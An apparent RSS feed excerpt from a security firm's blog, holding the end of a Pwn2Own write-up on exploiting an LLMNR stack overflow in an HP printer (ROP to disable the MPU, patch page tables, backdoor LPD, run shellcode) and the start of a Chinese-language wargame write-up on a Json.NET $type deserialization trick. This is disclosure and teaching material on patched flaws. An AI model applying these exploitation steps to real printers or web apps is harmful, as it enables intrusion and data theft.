&lt;p&gt;Here you can see that when HP processes LLMNR packets, it passes a fixed size buffer to consume_lables. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;consume_lables&lt;/code&gt; is used to process DNS labels, and the fixed buffer is used to store the results.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;int __fastcall consume_labels(char *src, char *dst, llmnr_hdr *a3)
{
  int v3; // r5
  int v4; // r12
  unsigned int len; // r3
  int v6; // r4
  char v7; // r6
  bool v8; // cc
  int v9; // r0
  unsigned __int8 chr; // r6
  int result; // r0

  v3 = 0;
  v4 = 0;
  len = 0;
  v6 = 0;
  while ( 1 )
  {
    chr = src[v3]; //-------------[1]
    if ( !chr )
      break;
    if ( (int)len &amp;lt;= 0 )
    {
      v8 = chr &amp;lt;= 0xC0u;
      if ( chr == 0xC0 )
      {
        v9 = src[v3 + 1];
        v6 = 1;
        v3 = 0;
        src = (char *)a3 + v9;
      }
      else
      {
        len = src[v3++];
        v8 = v4 &amp;lt;= 0;
      }
      if ( !v8 )
        dst[v4++] = &apos;.&apos;;
    }
    else
    {
      v7 = src[v3++];
      len = (char)(len - 1);
      dst[v4++] = v7; //----------[2]
    }
  }
  result = v3 + 1;
  dst[v4] = 0;
  if ( v6 )
    return 2;
  return result;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; will get the label length and then process it according to the type. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; is used as a case of length. There is no length check here, and the label is directly written into the dst buffer, leading to stack overflow. At this point, we thought we could exploit it in the similar way as Canon. However, when we were writing the exploit, we found that HP printers have more protection mechanisms.&lt;/p&gt;

&lt;h4 id=&quot;protection-1&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;XN(DEP)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Memory Protect Unit (MPU)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In this case, XN and MPU memory protection mechanisms are enabled, and this vulnerability has more restrictions. We &lt;strong&gt;can only overflow about 0x100 bytes without null byte&lt;/strong&gt;, which significantly restricts our ROP and makes it more challenging. We need to find other vulnerabilities or methods to achieve our goal.&lt;/p&gt;

&lt;p&gt;After a while, we started thinking about how HP printers implement XN(DEP) and MPU. Let’s review HP RTOS:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Linked with application code into single image&lt;/li&gt;
  &lt;li&gt;Many tasks run
    &lt;ul&gt;
      &lt;li&gt;in the same virtual address space&lt;/li&gt;
      &lt;li&gt;in kernel-mode&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After reviewing, we thought, can we bypass it by understanding the MMU and MPU in HP RTOS?&lt;/p&gt;

&lt;h4 id=&quot;mmu-in-hp-m283fdw&quot;&gt;MMU in HP M283fdw&lt;/h4&gt;

&lt;p&gt;HP M283fdw uses one-level page table translation and each translation table entry for translating a 1MB section. The translation table is located at &lt;strong&gt;0x4003c000&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Each translation table entry corresponds to a physical address and the permissions of the section. The CPU determines whether it can be executed or modified according to the entry. The permissions related here are AP, APX, and XN. We can also map any physical address through this translation table entry.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Generally, we can modify the translation table entry through ROP if we have stack overflow under high privileges. But when we tried to write directly to the translation table, the HP printer crashed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/25.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We checked and found that the leading cause of the memory fault exception is that Memory Protection Unit(MPU) protects the translation table.&lt;/p&gt;

&lt;h4 id=&quot;mpu-in-hp-m283fdw&quot;&gt;MPU in HP M283fdw&lt;/h4&gt;
&lt;p&gt;The MPU enables you to partition memory into regions and set individual protection attributes for each regions. It is an entirely different mechanism from MMU and is often found in IoT devices. HP enables MPU at boot and defines permissions for each region, so we cannot manipulate the page table.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/26.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a long time of reverse engineering and referencing the &lt;a href=&quot;https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Address-Map/Protected-Memory-System-Architecture--PMSAv7/Register-support-for-PMSAv7-in-the-SCS?lang=en#BEHJFJDI&quot;&gt;ARM Manual&lt;/a&gt;, we found that the MPU can be turned off by clearing MPU_CTRL. We found that the location is 0xE0400304, slightly different from ARM’s spec.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/27.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h4&gt;
&lt;p&gt;After understanding HP’s MMU and MPU mechanism, we can easily use ROP to turn off the MPU and successfully modify the translation table entry. We can arbitrarily modify the code of any service, and we finally chose &lt;a href=&quot;https://en.wikipedia.org/wiki/Line_Printer_Daemon_protocol&quot;&gt;Line Printer Daemon(LPD)&lt;/a&gt;. We modified it into a backdoor, read more payloads to the specified location, and finally executed the shellcode.&lt;/p&gt;

&lt;p&gt;But there is one thing that must be mentioned. After the translation table entry and LPD code are overwritten, be sure to &lt;strong&gt;flush TLB&lt;/strong&gt; and &lt;strong&gt;invalidate I-cache and D-cache&lt;/strong&gt;. Otherwise, it is very likely to execute in the old one, causing the exploit to fail.&lt;/p&gt;

&lt;p&gt;Flush TLB&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flush_tlb:
    mov r12, #0
    mcr p15, 0, r12, c8, c7, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Invalidate I-cache&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;disable_icache:
    mrc p15, 0, r1, c1, c0, 0
    bic r1, r1, #(1 &amp;lt;&amp;lt; 12)
    mcr p15, 0, r1, c1, c0, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;exploitation-step-1&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Trigger stack overflow in LLMNR and overwrite return address&lt;/li&gt;
  &lt;li&gt;Use limited ROP to
    &lt;ul&gt;
      &lt;li&gt;disable MPU&lt;/li&gt;
      &lt;li&gt;modify translation table entry and get read-write execute permission&lt;/li&gt;
      &lt;li&gt;flush TLB&lt;/li&gt;
      &lt;li&gt;modify the code of LPD&lt;/li&gt;
      &lt;li&gt;invalidate I-cache and D-cache&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Use modified LPD to read our shellcode and jump to shellcode&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-2&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;When we could execute the shellcode, we only had one week left, and we finally chose to use the exact string to display &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwned by DEVCORE&lt;/code&gt; on the LCD.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/28.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, we also tried to change the backdoor to the debug console to facilitate many functions, such as viewing memory information, playing music, etc.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/S9TkvaAmyMw&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;a href=&quot;https://twitter.com/fsecurelabs&quot;&gt;F-Secure Labs&lt;/a&gt; used the function of playing music to present it at that time. It is fascinating. You can go &lt;a href=&quot;https://youtu.be/c82uFBdTvII?t=1263&quot;&gt;here&lt;/a&gt; to look at the situation at the Pwn2Own.&lt;/p&gt;

&lt;h3 id=&quot;result&quot;&gt;Result&lt;/h3&gt;
&lt;p&gt;In Pwn2Own Austin 2021, we got 2nd place after pwning other devices and printers. We had a good experience and learned some new things.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/29.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;
&lt;p&gt;The first is to update regularly. All the printers mentioned have been patched. It is often ignored. We usually find printers lack of update for several years and even leave the default password directly in the corporate intranet.&lt;/p&gt;

&lt;h3 id=&quot;disable-unused-service&quot;&gt;Disable unused service&lt;/h3&gt;
&lt;p&gt;Another mitigation is to turn off services that are not in use as much as possible. Most printers default enable too many services that are usually unused. We even think that you can turn off the discovery service,
just open the service you want to use.&lt;/p&gt;

&lt;h3 id=&quot;firewall&quot;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;It would be better if you could apply a firewall. Most printers provide related functions.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;With code execution on the printers, in addition to printing things on the LCD, we can use the printer to steal confidential information, whether it is confidential documents or some credential. We can also use the printer for &lt;a href=&quot;https://en.wikipedia.org/wiki/Network_Lateral_Movement&quot;&gt;lateral movement&lt;/a&gt;, and because it is hard to detect, making it an excellent target for the red team.&lt;/p&gt;

&lt;p&gt;By the way, the protocols of the discovery service series on many printers are often vulnerable. If you want to find vulnerabilities in printers or other IoT devices, you can look in this direction.&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To Be Continue&lt;/h2&gt;
&lt;p&gt;We also found several vulnerabilities in the printer series at &lt;a href=&quot;https://www.thezdi.com/blog/2022/8/29/announcing-pwn2own-toronto-2022-and-introducing-the-soho-smashup&quot;&gt;Pwn2Own Toronto 2022&lt;/a&gt; last year. We will be releasing detailed information soon, so stay tuned for Part II.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&quot;&gt;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&quot;&gt;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&quot;&gt;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/</link>
                <guid>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en</guid>
                <pubDate>Thu, 05 Oct 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HITCON 2023 x DEVCORE Wargame: My todolist Write-up</title>
                <description>&lt;p&gt;為了 HITCON 2023 活動，我今年也在 DEVCORE 攤位上準備了三題趣味性質的 Wargame 題目讓參賽者在聽完議程的空閒之餘可以享受一下親自動手解題的快樂，而除了我所準備的題目以外，包括其他所有題目都可以在以下的 GitHub repository 裡找到：&lt;a href=&quot;https://github.com/DEVCORE-Wargame/HITCON-2023&quot;&gt;https://github.com/DEVCORE-Wargame/HITCON-2023&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;這次準備的題目分別是 What’s my IP、Submit flag 和 My todolist。第一個題目 What’s my IP 只要看程式碼就會知道是個 HTTP header 偽造 IP 加上 SQL Injectin 利用的簡單題，只是活動期間參賽者們得憑著經驗與駭客直覺以黑箱方式找出弱點的存在。第二個題目 Submit flag 就是一個經典的 Race Condition，是一個老梗但也是滲透測試中經常被忽略的細節，為了提高成功率從而避免讓參加者浪費太多時間，我特地在中間插入不必要的 sleep，雖然可能讓題目變得過於簡單，希望至少能提醒大家回想起還存在這種弱點就太好了。&lt;/p&gt;

&lt;p&gt;最後一個題目也是本篇文章想要和大家分享的主題：My todolist。從結論而言，這是一個簡單的 Json.NET 反序列化漏洞的白箱題目，存在漏洞的位置是在程式碼 &lt;a href=&quot;https://github.com/DEVCORE-Wargame/HITCON-2023/blob/main/challenges/web/My%20todolist/MyTodolist/MyTodolist/Extensions/WebExtension.cs#L20&quot;&gt;Extensions/WebExtension.cs&lt;/a&gt; 的第 20 行，但我想稍微和大家分享題目的由來。&lt;/p&gt;

&lt;p&gt;題目起源於我曾經在某些程式中看過類似以下的 Deep Copy 實作：&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們都知道當 DeserializeObject 的來源字串可以控制並且開啟 TypeNameHandling 時，我們可以輕易利用反序列化能初始化任意物件的特性執行任意程式碼或系統指令，然而在 Deep Clone 的使用情境下，來源字串是 SerializeObject 的輸出結果，這代表著任何標記物件名稱的 $type 屬性也是由 Json.NET 所控制而非由我們控制，所以這表示這段程式碼應該是無法被利用的才對，除非，若我們可以覆蓋 $type 屬性的話呢？&lt;/p&gt;

&lt;p&gt;這個疑問勾起了我的好奇心，因此讓我決定進行一些嘗試，當我嘗試用以下程式碼序列化一個 Dictionary 物件時，我得到了一個有趣的結果。&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;結果：&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;當我們序列化 Dictionary 時，我們所插入的任何 key 和 value 的 pair 都和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$type&lt;/code&gt; 屬性值在同一個層級，那假設我們 Dictionary 內含有值為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$type&lt;/code&gt; 的 key 時，會發生什麼事情？&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;會得到一個例外錯誤：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Newtonsoft.Json.JsonSerializationException: ‘Type specified in JSON ‘System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a’ is not compatible with ‘System.Collections.Generic.Dictionary`2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089’. Path ‘$type’, line 1, position 236.’&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;若建立 debug 斷點將 JsonConvert.SerializeObject 的結果字串印出來會得到：&lt;/p&gt;
&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其實從這段錯誤訊息就可以猜測出大致出錯的可能性，如果再稍微追入程式碼就會發現，我們設定的第二個 $type 確實成功讓 Json.NET 嘗試去覆蓋第一個 $type 指定的物件類型，但 Json.NET 在這段的處理會檢查第二個物件類型是否能夠相容於第一個物件類型，也就是檢查是否 assignable，若我們能找到某個類 Dictionary 物件可以成為 gadget 的話，這段程式碼也許將成為 exploitable。&lt;/p&gt;

&lt;p&gt;但要挖掘新的 gadget 十分困難，而且就算找到了，要作為 Wargame 題目也可能過於刁難，所以我這邊找到了一種變種情境，雖然是不常見的設定，但我覺得作為一道題目情境的話會非常有趣。&lt;/p&gt;

